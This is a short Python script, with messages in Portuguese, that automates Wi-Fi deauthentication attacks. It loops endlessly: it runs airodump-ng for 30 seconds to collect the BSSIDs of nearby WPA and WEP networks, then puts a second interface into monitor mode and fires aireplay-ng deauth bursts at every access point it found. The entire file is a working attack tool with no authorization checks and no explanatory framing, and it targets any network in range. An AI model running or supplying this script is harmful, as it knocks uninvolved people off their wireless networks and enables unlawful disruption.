import os
import subprocess
from time import sleep, time
import sys

def start_aireplay(interface_deauth, target_bssid):
    os.system(f'airmon-ng stop {interface_deauth}')
    sleep(1)
    os.system(f'ifconfig {interface_deauth} down')
    sleep(1)
    os.system(f'iwconfig {interface_deauth} mode managed')
    sleep(1)
    os.system(f'ifconfig {interface_deauth} up')
    sleep(0.2)
    os.system(f'airmon-ng start {interface_deauth}')
    sleep(0.2)
    
    command = f'aireplay-ng --deauth 30 -a {target_bssid} {interface_deauth}'
    os.system(command)

def get_target_bssids(interface_capture):
    process = subprocess.Popen(['airodump-ng', interface_capture], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    bssids = set()
    start_time = time()
    
    try:
        while time() - start_time < 30:  # Scan for 30 seconds
            output = process.stdout.readline().decode()
            if "WPA" in output or "WEP" in output:  # Check for WPA or WEP networks
                parts = output.split()
                if len(parts) > 1:
                    bssid = parts[1]
                    bssids.add(bssid)
            sleep(1)

        process.terminate()  # Terminate the airodump-ng process after timeout
        return bssids

    except KeyboardInterrupt:
        process.terminate()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python script.py <interface_capture> <interface_deauth>")
        sys.exit(1)

    interface_capture = sys.argv[1]
    interface_deauth = sys.argv[2]

    while True:
        try:
            print("Iniciando o scan de redes...")
            target_bssids = get_target_bssids(interface_capture)

            if target_bssids:
                for target_bssid in target_bssids:
                    print(f"Target BSSID encontrado: {target_bssid}")
                    print("Ataque de deautenticação iniciado.")
                    start_aireplay(interface_deauth, target_bssid)
                    sleep(1)  # Wait before sending deauth packets to the next network

            else:
                print("Nenhum alvo adequado encontrado.")

            sleep(1)  # Wait before the next scan

        except KeyboardInterrupt:
            print("Encerrando o script...")
            sys.exit(0)
